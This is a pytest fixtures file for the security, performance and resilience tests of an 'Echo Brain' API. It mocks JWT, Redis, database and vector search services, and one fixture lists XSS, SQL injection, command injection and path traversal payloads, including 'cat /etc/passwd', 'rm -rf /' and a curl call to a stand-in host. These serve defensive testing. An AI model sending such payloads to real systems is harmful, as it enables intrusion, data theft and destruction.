#!/usr/bin/env python3
"""
Comprehensive Test Configuration and Fixtures for Echo Brain API Testing Suite

Provides reusable test fixtures for:
- Security testing (authentication, authorization, rate limiting)
- Performance testing (metrics collection, benchmarking)
- Integration testing (service mocks, database pools)
- Resilience testing (circuit breakers, fallback mechanisms)
- CI/CD testing (environment configuration, test isolation)

Author: Echo Brain Testing Framework
Created: 2026-01-02
"""

import pytest
import asyncio
import sys
import os
import json
import tempfile
import shutil
import redis
from typing import Dict, Any, List, Optional
from unittest.mock import Mock, patch, MagicMock, AsyncMock
from datetime import datetime, timedelta
import jwt
import psutil
import asyncpg

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# Import project modules
from src.routing.auth_middleware import AuthMiddleware
from src.middleware.rate_limiting import RateLimitMiddleware
from src.db.pool_manager import AsyncConnectionPool


# ============================================================================
# Test Configuration
# ============================================================================

def pytest_configure(config):
    """Configure pytest with custom markers and settings for comprehensive testing."""
    config.addinivalue_line("markers", "security: marks tests as security tests")
    config.addinivalue_line("markers", "performance: marks tests as performance tests")
    config.addinivalue_line("markers", "integration: marks tests as integration tests")
    config.addinivalue_line("markers", "resilience: marks tests as resilience tests")
    config.addinivalue_line("markers", "api: marks tests as API tests")
    config.addinivalue_line("markers", "database: marks tests that require database")
    config.addinivalue_line("markers", "slow: marks tests as slow (deselect with '-m \"not slow\"')")
    config.addinivalue_line("markers", "benchmark: marks tests as performance benchmarks")
    config.addinivalue_line("markers", "unit: marks tests as unit tests")
    config.addinivalue_line("markers", "e2e: marks tests as end-to-end tests")
    config.addinivalue_line("markers", "auth: marks tests that require authentication")
    config.addinivalue_line("markers", "rate_limit: marks tests for rate limiting")
    config.addinivalue_line("markers", "circuit_breaker: marks tests for circuit breakers")


def pytest_collection_modifyitems(config, items):
    """Modify test collection to add markers automatically."""
    for item in items:
        # Auto-mark based on test file location
        if "security" in item.nodeid:
            item.add_marker(pytest.mark.security)
        if "performance" in item.nodeid:
            item.add_marker(pytest.mark.performance)
        if "integration" in item.nodeid:
            item.add_marker(pytest.mark.integration)
        if "resilience" in item.nodeid or "circuit_breaker" in item.nodeid:
            item.add_marker(pytest.mark.resilience)

        # Auto-mark based on test name
        if any(keyword in item.name.lower() for keyword in ["slow", "benchmark", "load", "stress"]):
            item.add_marker(pytest.mark.slow)
        if "auth" in item.name.lower() or "jwt" in item.name.lower():
            item.add_marker(pytest.mark.auth)
        if "rate_limit" in item.name.lower():
            item.add_marker(pytest.mark.rate_limit)
        if "circuit" in item.name.lower() or "breaker" in item.name.lower():
            item.add_marker(pytest.mark.circuit_breaker)


# ============================================================================
# Environment and Configuration Fixtures
# ============================================================================

@pytest.fixture(scope="session")
def test_environment():
    """Set up test environment variables and configuration."""
    test_env = {
        "JWT_SECRET": "test_secret_key_for_comprehensive_testing_suite_2026",
        "DB_HOST": "localhost",
        "DB_PORT": "5432",
        "DB_NAME": "test_echo_brain",
        "DB_USER": "test_user",
        "DB_PASSWORD": "test_password",
        "REDIS_HOST": "localhost",
        "REDIS_PORT": "6379",
        "REDIS_DB": "15",  # Use test database
        "ENVIRONMENT": "test"
    }

    # Set environment variables
    original_env = {}
    for key, value in test_env.items():
        original_env[key] = os.environ.get(key)
        os.environ[key] = value

    yield test_env

    # Restore original environment
    for key, original_value in original_env.items():
        if original_value is None:
            os.environ.pop(key, None)
        else:
            os.environ[key] = original_value


@pytest.fixture(scope="session")
def temp_test_directory():
    """Create temporary directory for test files."""
    temp_dir = tempfile.mkdtemp(prefix="echo_brain_test_")
    yield temp_dir
    shutil.rmtree(temp_dir, ignore_errors=True)


# ============================================================================
# Authentication and Security Fixtures
# ============================================================================

@pytest.fixture
def auth_middleware():
    """Create AuthMiddleware instance for testing."""
    with patch.dict(os.environ, {"JWT_SECRET": "test_secret_key_for_comprehensive_testing_suite_2026"}):
        return AuthMiddleware()


@pytest.fixture
def valid_jwt_token():
    """Generate a valid JWT token for testing."""
    payload = {
        'user_id': 'test_user_123',
        'username': 'testuser',
        'roles': ['user'],
        'permissions': ['api.access', 'board.view'],
        'exp': datetime.utcnow().timestamp() + 3600  # 1 hour
    }
    secret = "test_secret_key_for_comprehensive_testing_suite_2026"
    return jwt.encode(payload, secret, algorithm="HS256")


@pytest.fixture
def expired_jwt_token():
    """Generate an expired JWT token for testing."""
    payload = {
        'user_id': 'test_user_123',
        'username': 'testuser',
        'roles': ['user'],
        'permissions': ['api.access'],
        'exp': datetime.utcnow().timestamp() - 3600  # Expired 1 hour ago
    }
    secret = "test_secret_key_for_comprehensive_testing_suite_2026"
    return jwt.encode(payload, secret, algorithm="HS256")


@pytest.fixture
def admin_jwt_token():
    """Generate an admin JWT token for testing."""
    payload = {
        'user_id': 'admin_user_123',
        'username': 'admin',
        'roles': ['admin', 'system_admin'],
        'permissions': ['api.access', 'system.admin', 'board.admin', 'board.override_decisions'],
        'exp': datetime.utcnow().timestamp() + 3600
    }
    secret = "test_secret_key_for_comprehensive_testing_suite_2026"
    return jwt.encode(payload, secret, algorithm="HS256")


@pytest.fixture
def patrick_jwt_token():
    """Generate a JWT token for Patrick (creator access)."""
    payload = {
        'user_id': 'patrick',
        'username': 'patrick',
        'roles': ['admin', 'creator', 'system_admin'],
        'permissions': ['*'],
        'exp': datetime.utcnow().timestamp() + 3600
    }
    secret = "test_secret_key_for_comprehensive_testing_suite_2026"
    return jwt.encode(payload, secret, algorithm="HS256")


@pytest.fixture
def invalid_jwt_token():
    """Generate an invalid JWT token for testing."""
    return "invalid.jwt.token.for.testing"


@pytest.fixture
def malformed_jwt_token():
    """Generate a malformed JWT token for testing."""
    return "not_a_jwt_token_at_all"


# ============================================================================
# Rate Limiting Fixtures
# ============================================================================

@pytest.fixture
def rate_limiter():
    """Create RateLimitMiddleware instance for testing."""
    return RateLimitMiddleware()


@pytest.fixture
def mock_redis():
    """Mock Redis client for rate limiting tests."""
    with patch('redis.Redis') as mock_redis:
        mock_client = Mock()
        mock_client.ping.return_value = True

        # Mock pipeline for sliding window rate limiting
        mock_pipeline = Mock()
        mock_pipeline.execute.return_value = [None, 5, None, None]  # 5 current requests
        mock_client.pipeline.return_value = mock_pipeline

        # Mock individual Redis operations
        mock_client.zremrangebyscore.return_value = 2
        mock_client.zcard.return_value = 5
        mock_client.zadd.return_value = 1
        mock_client.expire.return_value = True

        mock_redis.return_value = mock_client
        yield mock_client


@pytest.fixture
def mock_redis_high_load():
    """Mock Redis client simulating high load conditions."""
    with patch('redis.Redis') as mock_redis:
        mock_client = Mock()
        mock_client.ping.return_value = True

        mock_pipeline = Mock()
        mock_pipeline.execute.return_value = [None, 25, None, None]  # High request count
        mock_client.pipeline.return_value = mock_pipeline

        mock_redis.return_value = mock_client
        yield mock_client


# ============================================================================
# Database and Connection Pool Fixtures
# ============================================================================

@pytest.fixture
def mock_db_config():
    """Provide mock database configuration for testing."""
    return {
        "database": "test_echo_brain",
        "user": "test_user",
        "password": "test_password",
        "host": "localhost",
        "port": 5432,
        "connect_timeout": 10,
        "application_name": "echo_brain_test"
    }


@pytest.fixture
async def mock_connection_pool(mock_db_config):
    """Create mock database connection pool."""
    with patch('src.db.pool_manager.get_secure_db_config') as mock_config:
        mock_config.return_value = mock_db_config

        with patch('asyncpg.create_pool') as mock_create_pool:
            mock_pool = AsyncMock()
            mock_pool.get_size.return_value = 10
            mock_pool.get_idle_size.return_value = 5

            # Mock connection with various query responses
            mock_connection = AsyncMock()
            mock_connection.fetch.return_value = [
                {'id': 1, 'name': 'test_record_1', 'value': 'test_value_1'},
                {'id': 2, 'name': 'test_record_2', 'value': 'test_value_2'}
            ]
            mock_connection.fetchone.return_value = {'id': 1, 'name': 'single_record'}
            mock_connection.fetchval.return_value = 1
            mock_connection.execute.return_value = "INSERT 1"

            # Mock context manager for connection acquisition
            mock_pool.acquire.return_value.__aenter__ = AsyncMock(return_value=mock_connection)
            mock_pool.acquire.return_value.__aexit__ = AsyncMock(return_value=None)

            mock_create_pool.return_value = mock_pool

            pool = AsyncConnectionPool(min_size=5, max_size=20)
            await pool.initialize()
            yield pool

            await pool.close()


@pytest.fixture
async def failing_connection_pool():
    """Create connection pool that simulates failures."""
    with patch('src.db.pool_manager.get_secure_db_config') as mock_config:
        mock_config.return_value = {
            "database": "test_echo_brain", "user": "test_user",
            "password": "test_password", "host": "localhost", "port": 5432
        }

        with patch('asyncpg.create_pool') as mock_create_pool:
            mock_pool = AsyncMock()
            mock_pool.get_size.return_value = 10
            mock_pool.get_idle_size.return_value = 0  # No idle connections

            # Mock connection that fails
            mock_connection = AsyncMock()
            mock_connection.fetch.side_effect = Exception("Database connection failed")
            mock_connection.execute.side_effect = Exception("Database query failed")

            mock_pool.acquire.side_effect = Exception("Connection pool exhausted")
            mock_create_pool.return_value = mock_pool

            pool = AsyncConnectionPool(min_size=5, max_size=20)
            # Don't initialize to simulate initialization failure
            yield pool


# ============================================================================
# Vector Memory and Search Fixtures
# ============================================================================

@pytest.fixture
def mock_vector_memory():
    """Mock vector memory system (Qdrant)."""
    with patch('src.services.real_vector_search.VectorSearch') as mock_vector_search:
        mock_instance = Mock()
        mock_instance.search_all_collections.return_value = [
            {
                'content': 'Previous conversation about API testing and integration',
                'metadata': {'source': 'conversations', 'confidence': 0.92}
            },
            {
                'content': 'Documentation about security best practices',
                'metadata': {'source': 'knowledge_base', 'confidence': 0.87}
            },
            {
                'content': 'User preferences and configuration settings',
                'metadata': {'source': 'user_data', 'confidence': 0.75}
            }
        ]
        mock_vector_search.return_value = mock_instance
        yield mock_instance


@pytest.fixture
def mock_qdrant_client():
    """Mock Qdrant client for vector operations."""
    with patch('qdrant_client.QdrantClient') as mock_qdrant:
        mock_client = Mock()

        # Mock collection operations
        mock_client.get_collections.return_value.collections = [
            Mock(name="conversations"),
            Mock(name="knowledge_base"),
            Mock(name="user_data")
        ]

        # Mock search operations
        mock_client.search.return_value = [
            Mock(
                id="search_result_1",
                payload={"text": "Relevant search result 1", "source": "conversations"},
                score=0.92
            ),
            Mock(
                id="search_result_2",
                payload={"text": "Relevant search result 2", "source": "knowledge_base"},
                score=0.87
            )
        ]

        # Mock upsert operations
        mock_client.upsert.return_value = Mock(status="completed")

        mock_qdrant.return_value = mock_client
        yield mock_client


# ============================================================================
# Performance Monitoring Fixtures
# ============================================================================

@pytest.fixture
def performance_monitor():
    """Performance monitoring fixture for collecting metrics."""
    class PerformanceMonitor:
        def __init__(self):
            self.start_time = None
            self.end_time = None
            self.response_times = []
            self.memory_usage = []
            self.cpu_usage = []
            self.error_count = 0
            self.success_count = 0
            self.concurrent_requests = 0
            self.max_concurrent = 0

        def start_monitoring(self):
            self.start_time = time.time()
            self.memory_usage.append(psutil.virtual_memory().percent)
            self.cpu_usage.append(psutil.cpu_percent())

        def stop_monitoring(self):
            self.end_time = time.time()
            self.memory_usage.append(psutil.virtual_memory().percent)
            self.cpu_usage.append(psutil.cpu_percent())

        def record_request_start(self):
            self.concurrent_requests += 1
            self.max_concurrent = max(self.max_concurrent, self.concurrent_requests)

        def record_request_end(self, response_time: float, success: bool):
            self.concurrent_requests -= 1
            self.response_times.append(response_time)
            if success:
                self.success_count += 1
            else:
                self.error_count += 1

        def get_metrics(self) -> Dict[str, Any]:
            total_duration = self.end_time - self.start_time if self.end_time else 0
            total_requests = len(self.response_times)

            return {
                'total_duration': total_duration,
                'total_requests': total_requests,
                'requests_per_second': total_requests / total_duration if total_duration > 0 else 0,
                'success_rate': self.success_count / (self.success_count + self.error_count) * 100 if (self.success_count + self.error_count) > 0 else 0,
                'avg_response_time': sum(self.response_times) / len(self.response_times) if self.response_times else 0,
                'max_concurrent_requests': self.max_concurrent,
                'memory_usage_change': self.memory_usage[-1] - self.memory_usage[0] if len(self.memory_usage) >= 2 else 0,
                'avg_cpu_usage': sum(self.cpu_usage) / len(self.cpu_usage) if self.cpu_usage else 0
            }

    import time
    return PerformanceMonitor()


# ============================================================================
# Circuit Breaker and Resilience Fixtures
# ============================================================================

@pytest.fixture
def mock_circuit_breaker():
    """Mock circuit breaker for resilience testing."""
    class MockCircuitBreaker:
        def __init__(self):
            self.state = "closed"  # closed, open, half_open
            self.failure_count = 0
            self.failure_threshold = 5
            self.success_count = 0
            self.success_threshold = 3
            self.last_failure_time = None

        async def call(self, func, *args, **kwargs):
            if self.state == "open":
                # Check if we should try half-open
                if self.last_failure_time and time.time() - self.last_failure_time > 60:
                    self.state = "half_open"
                else:
                    raise Exception("Circuit breaker is OPEN")

            try:
                result = await func(*args, **kwargs)
                self.failure_count = 0
                self.success_count += 1

                if self.state == "half_open" and self.success_count >= self.success_threshold:
                    self.state = "closed"
                    self.success_count = 0

                return result
            except Exception as e:
                self.failure_count += 1
                self.last_failure_time = time.time()

                if self.failure_count >= self.failure_threshold:
                    self.state = "open"
                elif self.state == "half_open":
                    self.state = "open"

                raise

        def get_state(self):
            return {
                'state': self.state,
                'failure_count': self.failure_count,
                'success_count': self.success_count
            }

    import time
    return MockCircuitBreaker()


@pytest.fixture
def mock_service_registry():
    """Mock service registry for testing service interactions."""
    class MockServiceRegistry:
        def __init__(self):
            self.services = {
                'database': {'healthy': True, 'response_time': 0.01, 'error_rate': 0.0},
                'vector_search': {'healthy': True, 'response_time': 0.05, 'error_rate': 0.1},
                'external_api': {'healthy': False, 'response_time': 5.0, 'error_rate': 0.8},
                'auth_service': {'healthy': True, 'response_time': 0.02, 'error_rate': 0.05},
                'redis_cache': {'healthy': True, 'response_time': 0.001, 'error_rate': 0.01},
            }

        async def call_service(self, service_name: str, operation: str = "default"):
            if service_name not in self.services:
                raise Exception(f"Service {service_name} not found")

            service_config = self.services[service_name]

            # Simulate response time
            await asyncio.sleep(service_config['response_time'])

            # Simulate random failures
            import random
            if random.random() < service_config['error_rate']:
                raise Exception(f"Service {service_name} error in {operation}")

            if not service_config['healthy']:
                raise Exception(f"Service {service_name} is unhealthy")

            return f"Success from {service_name}:{operation}"

        def set_service_health(self, service_name: str, healthy: bool, error_rate: float = None):
            if service_name in self.services:
                self.services[service_name]['healthy'] = healthy
                if error_rate is not None:
                    self.services[service_name]['error_rate'] = error_rate

        def get_service_health(self) -> Dict[str, Any]:
            return {name: config.copy() for name, config in self.services.items()}

    return MockServiceRegistry()


# ============================================================================
# HTTP Client and API Testing Fixtures
# ============================================================================

@pytest.fixture
async def async_http_client():
    """Async HTTP client for API testing."""
    import httpx

    async with httpx.AsyncClient(
        timeout=httpx.Timeout(10.0),
        headers={"User-Agent": "Echo Brain Test Suite"}
    ) as client:
        yield client


@pytest.fixture
def mock_fastapi_request():
    """Mock FastAPI Request object for testing."""
    from fastapi import Request

    mock_request = Mock(spec=Request)
    mock_request.url.path = "/api/echo/query"
    mock_request.method = "POST"
    mock_request.headers = {
        "Content-Type": "application/json",
        "User-Agent": "Echo Brain Test Suite"
    }
    mock_request.client.host = "192.168.1.100"
    mock_request.query_params = {}

    return mock_request


# ============================================================================
# Test Data Fixtures
# ============================================================================

@pytest.fixture
def sample_query_requests():
    """Sample query requests for testing."""
    return [
        {
            "query": "What is the status of the Tower services?",
            "conversation_id": "test_conversation_1",
            "user_id": "test_user",
            "intelligence_level": "auto"
        },
        {
            "query": "Generate an anime character with magical powers",
            "conversation_id": "test_conversation_2",
            "user_id": "test_user",
            "intelligence_level": "high"
        },
        {
            "query": "Explain quantum computing in simple terms",
            "conversation_id": "test_conversation_3",
            "user_id": "test_user",
            "intelligence_level": "standard"
        },
        {
            "query": "/health",
            "conversation_id": "test_conversation_4",
            "user_id": "test_user",
            "request_type": "system_command"
        }
    ]


@pytest.fixture
def malicious_payloads():
    """Collection of malicious payloads for security testing."""
    return {
        'xss_payloads': [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "';alert('xss');//",
            "<svg onload=alert('xss')>",
            "onmouseover=alert('xss')"
        ],
        'sql_injection_payloads': [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "admin'/*",
            "' OR 1=1#",
            "' UNION SELECT NULL,NULL,NULL--"
        ],
        'command_injection_payloads': [
            "; ls -la",
            "&& cat /etc/passwd",
            "| whoami",
            "; rm -rf /",
            "&& curl malicious.site",
            "`id`",
            "$(id)"
        ],
        'path_traversal_payloads': [
            "../../etc/passwd",
            "..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\SAM"
        ]
    }


# ============================================================================
# Cleanup and Teardown Fixtures
# ============================================================================

@pytest.fixture(autouse=True)
async def cleanup_after_test():
    """Automatic cleanup after each test."""
    yield

    # Cleanup any lingering asyncio tasks
    pending_tasks = [task for task in asyncio.all_tasks() if not task.done()]
    if pending_tasks:
        for task in pending_tasks:
            task.cancel()
        await asyncio.gather(*pending_tasks, return_exceptions=True)


@pytest.fixture(scope="session", autouse=True)
def setup_test_logging():
    """Set up logging configuration for tests."""
    import logging

    # Configure logging for tests
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        handlers=[
            logging.StreamHandler(),
            logging.FileHandler('/tmp/echo_brain_test.log')
        ]
    )

    # Reduce noise from external libraries
    logging.getLogger('asyncio').setLevel(logging.WARNING)
    logging.getLogger('httpx').setLevel(logging.WARNING)

    yield

    # Cleanup log handlers
    root_logger = logging.getLogger()
    for handler in root_logger.handlers[:]:
        handler.close()
        root_logger.removeHandler(handler)


# ============================================================================
# Test Utilities
# ============================================================================

@pytest.fixture
def test_utilities():
    """Utility functions for testing."""
    class TestUtilities:
        @staticmethod
        def assert_response_structure(response, required_fields):
            """Assert that response has required structure."""
            assert isinstance(response, dict), "Response should be a dictionary"
            for field in required_fields:
                assert field in response, f"Response missing required field: {field}"

        @staticmethod
        def assert_performance_metrics(metrics, min_rps=None, max_response_time=None, min_success_rate=None):
            """Assert performance metrics meet requirements."""
            if min_rps:
                assert metrics['requests_per_second'] >= min_rps, f"RPS too low: {metrics['requests_per_second']}"
            if max_response_time:
                assert metrics['avg_response_time'] <= max_response_time, f"Response time too high: {metrics['avg_response_time']}"
            if min_success_rate:
                assert metrics['success_rate'] >= min_success_rate, f"Success rate too low: {metrics['success_rate']}"

        @staticmethod
        async def wait_for_condition(condition_func, timeout=10.0, interval=0.1):
            """Wait for a condition to become true."""
            end_time = time.time() + timeout
            while time.time() < end_time:
                if await condition_func():
                    return True
                await asyncio.sleep(interval)
            return False

        @staticmethod
        def generate_test_data(count=10):
            """Generate test data for bulk operations."""
            import uuid
            return [
                {
                    'id': str(uuid.uuid4()),
                    'name': f'test_item_{i}',
                    'value': f'test_value_{i}',
                    'timestamp': datetime.now().isoformat()
                }
                for i in range(count)
            ]

    import time
    return TestUtilities()